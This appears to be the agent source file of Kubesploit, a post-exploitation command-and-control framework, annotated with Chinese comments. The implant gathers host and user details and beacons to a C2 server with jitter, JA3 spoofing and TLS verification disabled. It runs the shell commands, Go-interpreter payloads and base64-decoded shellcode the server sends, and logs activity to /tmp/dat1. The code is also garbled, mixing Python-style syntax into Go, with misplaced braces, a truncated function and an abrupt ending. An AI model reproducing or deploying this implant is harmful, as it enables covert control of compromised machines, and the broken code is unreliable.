# `kubesploit\pkg\agent\agent.go`

```
// Kubesploit是一个基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架。
// 本文件是Kubesploit的一部分。
// 版权所有 2021 CyberArk Software Ltd。

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，无论是许可证的第3版还是以后的版本。

// Kubesploit的分发希望能够有助于增强组织的安全性。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何保证；包括适销性或特定用途的隐含保证。有关更多详细信息，请参见GNU通用公共许可证。

// 您应该已经收到了GNU通用公共许可证的副本。
// 如果没有，请参见<http://www.gnu.org/licenses/>。

package agent

import (
    // 标准库
    "bytes"
    cryptorand "crypto/rand"
    "crypto/rsa"
    "crypto/sha1" // #nosec G505
    "crypto/sha256"
    "crypto/tls"
    "encoding/base64"
    "encoding/gob"
    "fmt"
    "io"
    "io/ioutil"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/user"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "time"

    "github.com/Ne0nd0g/ja3transport"
    // 第三方库
    "github.com/cretz/gopaque/gopaque"
    "github.com/fatih/color"
    "github.com/lucas-clemente/quic-go"
    "github.com/lucas-clemente/quic-go/http3"
    "github.com/satori/go.uuid"
    "golang.org/x/crypto/pbkdf2"
    "golang.org/x/net/http2"
    "gopkg.in/square/go-jose.v2"
    "gopkg.in/square/go-jose.v2/jwt"

    // Merlin
    "kubesploit/pkg"
    "kubesploit/pkg/core"
    "kubesploit/pkg/messages"
)

// 全局变量
var build = "nonRelease" // build是Merlin Agent程序的构建编号，在编译时设置
// 定义一个函数类型 executeCommandFunction，该函数接受两个字符串参数并返回两个字符串
type executeCommandFunction func(string, string)(string, string)

// 定义一个接口类型 merlinClient，包含四个方法：Do、Get、Head、Post
type merlinClient interface {
    Do(req *http.Request) (*http.Response, error)
    Get(url string) (resp *http.Response, err error)
    Head(url string) (resp *http.Response, err error)
    Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
}

// Agent 结构体用于代表代理对象，不导出以强制使用 New() 函数
type Agent struct {
    ID            uuid.UUID       // ID 是每个代理的唯一标识符
    Platform      string          // Platform 是代理运行的操作系统平台（如 windows）
    Architecture  string          // Architecture 是代理运行的操作系统架构（如 amd64）
    UserName      string          // UserName 是代理运行的用户名
    UserGUID      string          // UserGUID 是与用户名关联的全局唯一标识符
    HostName      string          // HostName 是计算机的主机名
    Ips           []string        // Ips 是分配给主机接口的所有 IP 地址的切片
    Pid           int             // Pid 是代理正在运行的进程 ID
    iCheckIn      time.Time       // iCheckIn 是代理初始签入时间的时间戳
    sCheckIn      time.Time       // sCheckIn 是代理上次状态签入时间的时间戳
    Version       string          // Version 是 Merlin Agent 程序的版本号
    Build         string          // Build 是 Merlin Agent 程序的构建号
    WaitTime      time.Duration   // WaitTime 是代理在签入之间等待的时间
    PaddingMax    int             // PaddingMax 是随机选择的消息填充长度的最大值
}
    // MaxRetry是代理在放弃之前失败检查尝试的最大次数
    MaxRetry      int             
    // FailedCheckin是失败检查总数的计数
    FailedCheckin int             
    // Skew是添加到每个WaitTime以变化检查尝试的偏差大小
    Skew          int64           
    // Verbose启用标准输出的详细消息
    Verbose       bool            
    // Debug启用标准输出的调试消息
    Debug         bool            
    // Proto包含代理正在使用的传输协议（例如http2或http3）
    Proto         string          
    // Client是客户端用于代理通信的连接的接口
    Client        *merlinClient   
    // UserAgent是与HTTP连接一起使用的用户代理字符串
    UserAgent     string          
    // initial标识代理是否成功完成了第一次初始检查
    initial       bool            
    // KillDate是Unix时间戳，表示可执行文件在此时间之后将不再运行（如果为0，则不会使用）
    KillDate      int64           
    // RSAKeys是RSA私钥/公钥对；私钥用于解密消息
    RSAKeys       *rsa.PrivateKey 
    // PublicKey（服务器的）公钥用于加密消息
    PublicKey     rsa.PublicKey   
    // secret用于执行对称加密操作
    secret        []byte          
    // JWT是身份验证JSON Web Token
    JWT           string          
    // URL是C2服务器的URL
    URL           string          
    // Host是HTTP Host标头，通常与域前置一起使用
    Host          string          
    // pwdU是5000次PBKDF2的SHA256哈希与30个字符随机字符串输入的哈希
    pwdU          []byte          
    // psk是预共享密钥
    psk           string          
    // JA3是JA3签名（不是MD5哈希），用于生成JA3客户端
    JA3           string          
    // 记录是Recorder接口
    record        Recorder
// New函数创建一个具有特定值的新代理结构，并返回该对象
func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
    // 如果debug为true，则输出进入agent.New函数的调试信息
    if debug {
        message("debug", "Entering agent.New function")
    }

    // 创建一个新的Recorder对象，存储路径为/tmp/dat1
    recorder := NewRecorder("/tmp/dat1")
    // 创建一个Agent对象，并初始化其属性
    a := Agent{
        ID:           uuid.NewV4(),
        Platform:     runtime.GOOS,
        Architecture: runtime.GOARCH,
        Pid:          os.Getpid(),
        Version:      kubesploitVersion.Version,
        WaitTime:     30000 * time.Millisecond,
        PaddingMax:   4096,
        MaxRetry:     7,
        Skew:         3000,
        Verbose:      verbose,
        Debug:        debug,
        Proto:        protocol,
        UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
        initial:      false,
        KillDate:     0,
        URL:          url,
        Host:         host,
        JA3:          ja3,
        record:       recorder,
    }

    // 设置随机数种子
    rand.Seed(time.Now().UnixNano())

    // 获取当前用户信息
    u, errU := user.Current()
    if errU != nil {
        return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
    }

    // 设置Agent对象的用户名和用户组ID
    a.UserName = u.Username
    a.UserGUID = u.Gid

    // 获取主机名
    h, errH := os.Hostname()
    if errH != nil {
        return a, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
    }

    // 设置Agent对象的主机名
    a.HostName = h

    // 获取网络接口信息
    interfaces, errI := net.Interfaces()
    if errI != nil {
        return a, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
    }

    // 遍历网络接口，获取IP地址信息
    for _, iface := range interfaces {
        addrs, err := iface.Addrs()
        if err == nil {
            for _, addr := range addrs {
                a.Ips = append(a.Ips, addr.String())
            }
        } else {
            return a, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
        }
    }

    var errClient error
}
    # 调用 getClient 函数获取客户端和可能的错误
    a.Client, errClient = getClient(a.Proto, proxy, a.JA3)

    # 如果获取客户端时出现错误，返回错误信息
    if errClient != nil:
        return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)

    # 生成一个随机密码，并通过5000次PBKDF2迭代处理；用于OPAQUE
    x := core.RandStringBytesMaskImprSrc(30)
    a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)

    # 设置加密密钥为预身份验证预共享密钥
    a.psk = psk

    # 生成RSA密钥对
    privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
    if rsaErr != nil:
        return a, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr)

    # 将生成的RSA私钥赋值给a.RSAKeys
    a.RSAKeys = privateKey

    # 如果设置了Verbose标志，输出主机信息
    if a.Verbose:
        message("info", "Host Information:")
        message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
        message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
        message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
        message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) #TODO A username like _svctestaccont causes error
        message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
        message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
        message("info", fmt.Sprintf("\tPID: %d", a.Pid))
        message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
        message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
        message("info", fmt.Sprintf("\tProxy: %v", proxy))
        message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))

    # 如果设置了debug标志，输出调试信息
    if debug:
        message("debug", "Leaving agent.New function")

    # 返回a和nil，表示函数执行成功
    return a, nil
// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
    // 设置随机种子
    rand.Seed(time.Now().UTC().UnixNano())

    // 如果设置了详细输出，打印代理版本和构建信息
    if a.Verbose {
        message("note", fmt.Sprintf("Agent version: %s", kubesploitVersion.Version))
        message("note", fmt.Sprintf("Agent build: %s", build))
    }

    for {
        // 检查 killdate 是否到达，确定代理是否应该 checkin
        if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
            // 如果是初始状态，进行 checkin
            if a.initial {
                if a.Verbose {
                    message("note", "Checking in...")
                }
                go a.statusCheckIn()
            } else {
                // 否则进行初始 checkin
                a.initial = a.initialCheckIn()
            }
            // 如果失败的 checkin 次数超过最大重试次数，返回错误
            if a.FailedCheckin >= a.MaxRetry {
                return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
            }
        } else {
            // 如果超过了 killdate，返回错误
            return fmt.Errorf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339))
        }

        // 计算时间偏移
        timeSkew := time.Duration(0)

        if a.Skew > 0 {
            // 如果设置了时间偏移，随机生成时间偏移
            timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK
        }

        // 计算总等待时间
        totalWaitTime := a.WaitTime + timeSkew

        // 如果设置了详细输出，打印睡眠时间和当前时间
        if a.Verbose {
            message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
        }
        // 等待指定时间
        time.Sleep(totalWaitTime)
    }
}

// 初始 checkin 函数
func (a *Agent) initialCheckIn() bool {

    if a.Debug {
        message("debug", "Entering initialCheckIn function")
    }

    // 注册
    errOPAQUEReg := a.opaqueRegister()
    if errOPAQUEReg != nil {
        // 如果注册失败，增加失败 checkin 次数
        a.FailedCheckin++
        if a.Verbose {
            message("warn", errOPAQUEReg.Error())
            message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
        }
        return false
    // 认证
    errOPAQUEAuth := a.opaqueAuthenticate()
    // 如果认证失败，增加失败检查次数，并根据是否开启详细输出打印警告信息和失败检查次数
    if errOPAQUEAuth != nil {
        a.FailedCheckin++
        if a.Verbose {
            message("warn", errOPAQUEAuth.Error())
            message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
        }
        return false
    }

    // 现在代理已经认证，发送代理信息
    infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
    // 如果发送代理信息失败，增加失败检查次数，并根据是否开启详细输出打印警告信息和失败检查次数
    if errAgentInfo != nil {
        a.FailedCheckin++
        if a.Verbose {
            message("warn", errAgentInfo.Error())
            message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
        }
        return false
    }
    // 处理代理信息的返回结果
    _, errHandler := a.messageHandler(infoResponse)
    if errHandler != nil {
        if a.Verbose {
            message("warn", errHandler.Error())
        }
    }

    // 使用认证派生的密钥发送 RSA 密钥加密
    errRSA := a.rsaKeyExchange()
    // 如果 RSA 密钥交换失败，根据是否开启详细输出打印警告信息
    if errRSA != nil {
        if a.Verbose {
            message("warn", errRSA.Error())
        }
    }

    // 如果存在失败检查且小于最大重试次数，更新服务器的失败检查次数，并根据是否开启详细输出打印相关信息
    if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
        if a.Verbose {
            message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
        }
        a.FailedCheckin = 0
        infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
        if err != nil {
            if a.Verbose {
                message("warn", err.Error())
            }
            return false
        }
        _, errHandler2 := a.messageHandler(infoResponse)
        if errHandler2 != nil {
            if a.Verbose {
                message("warn", errHandler2.Error())
            }
        }
    }

    // 如果开启调试模式，打印调试信息
    if a.Debug {
        message("debug", "Leaving initialCheckIn function, returning True")
    }
    // 更新检查时间并返回成功
    a.iCheckIn = time.Now().UTC()
    return true
}

// statusCheckIn performs the status check-in for the agent
func (a *Agent) statusCheckIn() {
    // 如果调试模式开启，输出进入函数的调试信息
    if a.Debug {
        message("debug", "Entering into agent.statusCheckIn()")
    }

    // 创建状态消息对象
    statusMessage := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "StatusCheckIn",
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 发送状态消息并接收响应
    j, reqErr := a.sendMessage("POST", statusMessage)

    // 重置失败检查次数
    a.FailedCheckin = 0
    // 记录状态检查时间
    a.sCheckIn = time.Now().UTC()

    // 如果调试模式开启，输出消息相关信息
    if a.Debug {
        message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
        message("debug", fmt.Sprintf("Message Type: %s", j.Type))
        message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
    }

    // 处理接收到的消息
    m, err := a.messageHandler(j)
    if err != nil {
        // 如果出现错误且详细模式开启，输出警告信息
        if a.Verbose {
            message("warn", err.Error())
        }
        return
    }

    // 当消息类型为空时，无需进一步处理
    if m.Type == "" {
        return
    }

    // 发送处理后的消息
    _, errR := a.sendMessage("post", m)
    if errR != nil {
        // 如果出现错误且详细模式开启，输出警告信息
        if a.Verbose {
            message("warn", errR.Error())
        }
        return
    }

}

// getClient 根据传入的协议（如 h2 或 http3）返回一个 HTTP 客户端
func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {

    var m merlinClient

    /* #nosec G402 */
    // G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
    // 设置 TLS 配置
    TLSConfig := &tls.Config{
        MinVersion:         tls.VersionTLS12,
        InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
        },
        NextProtos: []string{protocol},
    }

    // 代理
    var proxy func(*http.Request) (*url.URL, error);
    // 如果代理 URL 不为空，则解析代理 URL，并创建代理对象
    if proxyURL != "" {
        rawURL, errProxy := url.Parse(proxyURL)
        // 如果解析代理 URL 出错，则返回错误信息
        if errProxy != nil {
            return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
        }
        proxy = http.ProxyURL(rawURL)
    }

    // 如果 JA3 不为空，则创建 JA3 客户端
    if ja3 != "" {
        JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
        // 如果创建 JA3 客户端出错，则返回错误信息
        if errJA3 != nil {
            return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
        }
        tr, err := ja3transport.NewTransportInsecure(ja3)
        // 如果创建传输对象出错，则返回错误信息
        if err != nil {
            return nil, err
        }

        // 如果代理 URL 不为空，则设置传输对象的代理
        if proxyURL != "" {
            tr.Proxy = proxy
        }

        JA3.Transport = tr

        m = JA3
        return &m, nil
    }

    // 根据协议类型创建对应的传输对象
    var transport http.RoundTripper
    switch strings.ToLower(protocol) {
    case "http3":
        // 如果协议类型为 HTTP3，则创建 HTTP3 传输对象
        transport = &http3.RoundTripper{
            QuicConfig: &quic.Config{
                // 设置最大空闲超时时间
                MaxIdleTimeout: time.Second * 30,
                // 启用 KeepAlive 以保持连接活跃
                KeepAlive: true,
                // 设置握手超时时间
                HandshakeTimeout: time.Second * 30,
            },
            TLSClientConfig: TLSConfig,
        }
    case "h2":
        // 如果协议类型为 H2，则创建 H2 传输对象
        transport = &http2.Transport{
            TLSClientConfig: TLSConfig,
        }
    # 根据协议类型选择不同的传输方式
    case "h2c":
        # 如果是 h2c 协议，使用 http2.Transport，并允许 HTTP
        transport = &http2.Transport{
            AllowHTTP: true,
            # 定义 DialTLS 函数，用于建立网络连接
            DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
                return net.Dial(network, addr)
            },
        }
    case "https":
        # 如果是 https 协议
        if proxyURL != "":
            # 如果有代理，使用 http.Transport，并设置 TLS 配置和代理
            transport = &http.Transport{
                TLSClientConfig: TLSConfig,
                Proxy:           proxy,
            }
        else:
            # 如果没有代理，使用 http.Transport，并设置 TLS 配置
            transport = &http.Transport{
                TLSClientConfig: TLSConfig,
            }
    case "http":
        # 如果是 http 协议
        if proxyURL != "":
            # 如果有代理，使用 http.Transport，并设置最大空闲连接数和代理
            transport = &http.Transport{
                MaxIdleConns: 10,
                Proxy:        proxy,
            }
        else:
            # 如果没有代理，使用 http.Transport，并设置最大空闲连接数
            transport = &http.Transport{
                MaxIdleConns: 10,
            }
    default:
        # 如果协议类型不是 h2c、https、http 中的任何一个，返回错误
        return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
    # 根据选择的传输方式创建 http 客户端
    m = &http.Client{Transport: transport}
    # 返回创建的 http 客户端
    return &m, nil
// sendMessage 是一个通用函数，用于接收 messages.Base 结构体，对其进行编码、加密，并发送到服务器
// 响应消息将被解密、解码，并返回一个 messages.Base 结构体
func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
    if a.Debug {
        message("debug", "Entering into agent.sendMessage()")
    }
    if a.Verbose {
        message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
    }

    var returnMessage messages.Base

    // 将 messages.Base 转换为 gob 格式
    messageBytes := new(bytes.Buffer)
    errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
    if errGobEncode != nil {
        return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
    }

    // 获取 JWE
    jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
    if errJWE != nil {
        return returnMessage, errJWE
    }

    // 将 JWE 编码为 gob 格式
    jweBytes := new(bytes.Buffer)
    errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
    if errJWEBuffer != nil {
        return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
    }

    switch strings.ToLower(method) {
    default:
        return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
    }
}

// messageHandler 根据消息类型执行相应的操作
func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
    if a.Debug {
        message("debug", "Entering into agent.messageHandler function")
    }
    if a.Verbose {
        message("success", fmt.Sprintf("%s message type received!", m.Type))
    }

    returnMessage := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }
    # 如果输入消息的 UUID 不匹配代理的 UUID，则返回错误信息
    if a.ID != m.ID:
        return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
    # 创建一个空的命令结果对象
    var c messages.CmdResults
    # 如果消息中包含令牌，则更新代理的 JWT 令牌
    if m.Token != "":
        a.JWT = m.Token

    # 根据消息类型执行不同的操作
    switch m.Type:
        # 如果消息类型为 "CmdPayload"，则执行命令并获取标准输出和标准错误
        case "CmdPayload":
            p := m.Payload.(messages.CmdPayload)
            c.Job = p.Job
            c.Stdout, c.Stderr = a.executeCommand(p,ExecuteCommand)
        # 如果消息类型为 "CmdPayloadScriptFromPath"，则执行脚本命令并获取标准输出和标准错误
        case "CmdPayloadScriptFromPath":
            p := m.Payload.(messages.CmdPayload)
            c.Job = p.Job
            c.Stdout, c.Stderr = a.executeCommand(p,ExecuteCommandScriptInCommands)
        # 如果消息类型为 "CmdGoPayload"，则执行 Go 解释器命令
        case "CmdGoPayload":
            p := m.Payload.(messages.CmdPayload)
            c.Job = p.Job
            c.Stdout, c.Stderr = a.executeGoInterpreterCommand(p)
        # 如果消息类型为 "CmdGoProgressPayload"，则执行带进度的 Go 解释器命令
        case "CmdGoProgressPayload":
            p := m.Payload.(messages.CmdPayload)
            c.Job = p.Job
            c.Stdout, c.Stderr = a.executeGoInterpreterCommandProgress(p, c, returnMessage, a)
        # 如果消息类型为 "ServerOk"，并且代理设置为详细模式，则输出接收到 "Server OK" 的消息
        case "ServerOk":
            if a.Verbose:
                message("note", "Received Server OK, doing nothing")
            return returnMessage, nil
        # 如果消息类型为 "Shellcode"，并且代理设置为详细模式，则输出接收到 "Execute shellcode command" 的消息
        case "Shellcode":
            if a.Verbose:
                message("note", "Received Execute shellcode command")
            # 获取消息中的 shellcode 对象
            s := m.Payload.(messages.Shellcode)
            var e error
            c.Job = s.Job
            # 执行 shellcode，并根据执行结果更新标准输出或标准错误
            e = a.executeShellcode(s) # Execution method determined in function
            if e != nil:
                c.Stderr = fmt.Sprintf("there was an error with the shellcode module:\r\n%s", e.Error())
            else:
                c.Stdout = "Shellcode module executed without errors"
    # 根据消息类型进行不同的处理
    case "NativeCmd":
        # 将消息载荷转换为 NativeCmd 类型
        p := m.Payload.(messages.NativeCmd)
        # 根据命令类型进行不同的处理
        switch p.Command:
            # 处理 ls 命令
            case "ls":
                # 调用 list 方法获取文件列表
                listing, err := a.list(p.Args)
                # 如果出现错误，将错误信息写入标准错误输出
                if err != nil:
                    c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
                    break
                # 将文件列表写入标准输出
                c.Stdout = listing
            # 处理 cd 命令
            case "cd":
                # 尝试切换工作目录
                err := os.Chdir(p.Args)
                # 如果出现错误，将错误信息写入标准错误输出
                if err != nil:
                    c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
                # 如果切换成功，获取当前工作目录并写入标准输出
                else:
                    path, pathErr := os.Getwd()
                    if pathErr != nil:
                        c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
                    else:
                        c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
            # 处理 pwd 命令
            case "pwd":
                # 获取当前工作目录
                dir, err := os.Getwd()
                # 如果出现错误，将错误信息写入标准错误输出
                if err != nil:
                    c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
                # 将当前工作目录写入标准输出
                else:
                    c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
            # 处理未知命令
            default:
                c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
    # 处理 KeyExchange 消息
    case "KeyExchange":
        # 将消息载荷转换为 KeyExchange 类型
        p := m.Payload.(messages.KeyExchange)
        # 更新公钥
        a.PublicKey = p.PublicKey
        # 返回消息和空错误
        return returnMessage, nil
    # 处理 ReAuthenticate 消息
    case "ReAuthenticate":
        # 如果设置了详细输出，打印重新认证的提示信息
        if a.Verbose:
            message("note", "Re-authenticating with OPAQUE protocol")
        # 进行 OPAQUE 协议的重新认证
        errAuth := a.opaqueAuthenticate()
        # 如果出现错误，返回消息和错误信息
        if errAuth != nil:
            return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
        # 清空消息类型，返回消息和空错误
        m.Type = ""
        return returnMessage, nil
    # 如果消息类型不在预期范围内，则返回错误消息和相应的错误
    default:
        return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
    }

    # 如果设置了详细输出并且标准输出不为空，则输出成功消息
    if a.Verbose && c.Stdout != "":
        message("success", c.Stdout)
    # 如果设置了详细输出并且标准错误不为空，则输出警告消息
    if a.Verbose && c.Stderr != "":
        message("warn", c.Stderr)
    
    # 设置返回消息的类型为"CmdResults"
    returnMessage.Type = "CmdResults"
    # 设置返回消息的载荷为命令执行结果
    returnMessage.Payload = c
    # 如果设置了调试模式，则输出离开函数的调试消息
    if a.Debug:
        message("debug", "Leaving agent.messageHandler function without error")
    # 返回成功的返回消息和空的错误
    return returnMessage, nil
# 定义一个方法，用于执行命令，并返回标准输出和标准错误输出
func (a *Agent) executeCommand(j messages.CmdPayload, executeFunction executeCommandFunction) (stdout string, stderr string) {
    # 如果处于调试模式，则输出接收到的执行命令函数的输入参数
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
    # 如果处于详细模式，则输出正在执行的命令和参数
    } else if a.Verbose {
        message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
    }

    # 调用执行命令函数，获取标准输出和标准错误输出
    stdout, stderr = executeFunction(j.Command, j.Args)

    # 如果处于详细模式，则根据标准错误输出进行不同的消息输出
    if a.Verbose {
        if stderr != "" {
            message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
            message("success", stdout)
            message("warn", fmt.Sprintf("Error: %s", stderr))
        } else {
            message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
        }
    }

    # 返回标准输出和标准错误输出
    return stdout, stderr
}

# 定义一个方法，用于执行 Go 解释器命令，并返回标准输出和标准错误输出
func (a *Agent) executeGoInterpreterCommand(j messages.CmdPayload) (stdout string, stderr string) {
    # 如果处于调试模式，则输出接收到的执行命令函数的输入参数
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
    # 如果处于详细模式，则输出正在执行的命令和参数
    } else if a.Verbose {
        message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
    }

    # 记录执行的命令和参数
    a.record.recordCommand(j.Command, j.ArgsArray)

    # 调用执行 Go 解释器命令函数，获取标准输出和标准错误输出
    stdout, stderr = ExecuteCommandGoInterpreter(j.Command, j.ArgsArray)
    # 记录命令的输出
    a.record.recordOutput(stdout)

    # 如果处于详细模式，则根据标准错误输出进行不同的消息输出
    if a.Verbose {
        if stderr != "" {
            message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
            message("success", stdout)
            message("warn", fmt.Sprintf("Error: %s", stderr))
        } else {
            message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
        }
    }

    # 返回标准输出和标准错误输出
    return stdout, stderr
}

# TODO: 添加记录？
# 定义一个方法，用于执行 Go 解释器命令并返回进度
func (a *Agent) executeGoInterpreterCommandProgress(j messages.CmdPayload, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
    # 如果调试模式开启，则输出接收到的执行命令函数的输入参数
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

    # 如果调试模式未开启但详细模式开启，则输出执行的命令和参数
    } else if a.Verbose {
        message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
    }

    # 使用Go解释器执行命令，并获取标准输出和标准错误
    stdout, stderr = ExecuteCommandGoInterpreterProgress(j.Command, j.ArgsArray, result, returnMessage, agent)

    # 如果详细模式开启，则根据标准错误输出相应的消息
    if a.Verbose {
        if stderr != "" {
            message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
            message("success", stdout)
            message("warn", fmt.Sprintf("Error: %s", stderr))

        # 如果没有标准错误，则输出命令的标准输出
        } else {
            message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
        }
    }

    # 返回命令的标准输出和标准错误
    return stdout, stderr
# 记录命令和参数到文件
func recordCommand2(command string, args []string){
    # 创建一个字符串构建器
    var sb strings.Builder
    # 将当前时间和命令信息格式化后添加到字符串构建器中
    sb.WriteString(fmt.Sprintf("%s [*] Payload:\n", time.Now().UTC().Format(time.RFC3339)))
    sb.WriteString(command + "\n")
    # 遍历参数列表，将每个参数添加到字符串构建器中
    for _, arg := range(args) {
        sb.WriteString(arg + "\n")
    }
    sb.WriteString("\n")
    # 将构建器中的内容记录到文件中
    recordToFile(sb.String())
}

# 记录输出到文件
func recordOutput2(output string){
    # 创建一个字符串构建器
    var sb strings.Builder
    # 将当前时间和输出信息格式化后添加到字符串构建器中
    sb.WriteString(fmt.Sprintf("%s [*] Output:\n", time.Now().UTC().Format(time.RFC3339)))
    sb.WriteString(output + "\n")
    # 将构建器中的内容记录到文件中
    recordToFile(sb.String())
}

# 将内容记录到文件中
func recordToFile2(output string){
    # 指定文件名
    filename := "/tmp/dat1"
    # 打开文件，如果文件不存在则创建，以追加模式写入
    f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
    if err != nil {
        panic(err)
    }
    # 延迟关闭文件
    defer f.Close()
    # 将内容写入文件
    if _, err = f.WriteString(output); err != nil {
        # 如果写入失败，记录警告信息
        message("warn", fmt.Sprintf("Failed to write to file: %s, error: %s", filename, output))
    }
}

# 执行 shellcode
func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
    # 如果处于调试模式，记录调试信息
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
    }
    # 解码 shellcode 字符串
    shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)
    # 如果解码出错，记录警告信息并返回错误
    if errDecode != nil {
        if a.Verbose {
            message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
            message("warn", errDecode.Error())
        }
        return errDecode
    }
    # 如果处于详细模式，记录信息
    if a.Verbose {
        message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))
    }
    # 如果处于调试模式，记录信息
    if a.Debug {
        message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
    }
}
    # 如果 shellcode 的执行方法是 "self"
    if shellcode.Method == "self" {
        # 执行本地 shellcode
        err := ExecuteShellcodeSelf(shellcodeBytes)
        # 如果执行出错
        if err != nil {
            # 如果设置了详细输出
            if a.Verbose {
                # 输出警告信息，包括执行的 shellcode 内容和错误信息
                message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
                message("warn", fmt.Sprintf("Error: %s", err.Error()))
            }
        } else {
